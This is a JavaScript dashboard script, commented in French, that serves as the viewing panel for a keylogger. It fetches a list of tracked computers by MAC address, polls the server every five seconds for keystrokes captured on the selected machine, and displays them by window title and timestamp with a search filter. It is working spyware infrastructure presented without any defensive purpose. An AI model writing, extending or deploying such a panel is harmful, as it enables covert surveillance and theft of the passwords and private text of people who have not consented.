let logData = []; // Stocke les frappes récupérées

document.addEventListener("DOMContentLoaded", function () {
    const computerSelect = document.getElementById("computer-list"); // Sélecteur des machines
    const logContent = document.getElementById("log-content"); // Contenu des logs affichés
    const mainMessage = document.getElementById("main-message"); // Message par défaut
    const recordingStatus = document.getElementById("recordingStatus"); // Indicateur d'enregistrement

    // Récupérer la liste des machines enregistrées
    async function fetchComputers() {
        try {
            const response = await fetch('/api/get_users'); // Correction de l'URL
            const data = await response.json();

            // Réinitialise la liste et ajoute l'option par défaut
            computerSelect.innerHTML = '<option value="">Select a tracked computer</option>';

            data.forEach(mac => {
                const option = document.createElement('option');
                option.value = mac;
                option.textContent = mac;
                computerSelect.appendChild(option);
            });
        } catch (error) {
            console.error("Erreur lors de la récupération des machines :", error);
        }
    }

    // Récupérer les frappes enregistrées pour la machine sélectionnée
    async function fetchData() {
        const selectedMac = computerSelect.value;
        if (!selectedMac) return;

        try {
            const response = await fetch(`/api/get_data/${selectedMac}`); // Correction de l'URL
            const data = await response.json();

            console.log("Données récupérées :", data);
            if (data.error) {
                logContent.innerHTML = `<p style="color: red;">${data.error}</p>`;
                return;
            }

            logData = data || [];
            displayContent(logData);
        } catch (error) {
            console.error("Erreur lors de la récupération des logs :", error);
        }
    }

    // Afficher les logs dans l'interface
    function displayContent(content) {
        logContent.innerHTML = "";

        let lastWindow = null;

        content.forEach(entry => {
            const { window_mame, timestamp, data } = entry;

            // Convertir timestamp en date + heure lisible
            const dateObj = new Date(timestamp);
            const dateFormatted = dateObj.toLocaleDateString(); // Format: JJ/MM/AAAA
            const timeFormatted = dateObj.toLocaleTimeString(); // Format: HH:MM:SS

            // Si la fenêtre a changé, on affiche un nouveau bloc
            if (window_mame !== lastWindow) {
                const windowTitle = document.createElement("h3");
                windowTitle.textContent = window_mame;
                windowTitle.style.fontWeight = "bold";
                windowTitle.style.marginTop = "10px";
                logContent.appendChild(windowTitle);
                lastWindow = window_mame;
            }

            // Afficher la date + heure en gras
            const timeElement = document.createElement("p");
            timeElement.innerHTML = `<strong>${dateFormatted} - ${timeFormatted}</strong>`;

            logContent.appendChild(timeElement);

            // Afficher le texte tapé
            const dataElement = document.createElement("p");
            dataElement.textContent = data;
            dataElement.style.marginBottom = "5px";
            logContent.appendChild(dataElement);
        });

        // Auto-scroll sauf si l'utilisateur a scrollé vers le haut
        const isScrolledToBottom = logContent.scrollHeight - logContent.clientHeight <= logContent.scrollTop + 10;
        if (isScrolledToBottom) {
            logContent.scrollTop = logContent.scrollHeight;
        }
    }

    // Filtrer les frappes en fonction de la recherche utilisateur
    function searchContent(query) {
        if (!query) return displayContent(logData);
        const filtered = logData.filter(entry => JSON.stringify(entry).includes(query));
        displayContent(filtered);
    }

    // Lancer la récupération des données toutes les 5 secondes
    fetchComputers();
    setInterval(fetchData, 5000);

    // Gérer le changement de sélection d'un ordinateur
    computerSelect.addEventListener("change", function () {
        if (computerSelect.value) {
            mainMessage.style.display = "none";
            recordingStatus.style.display = "block";
            fetchData();
        }
    });
});
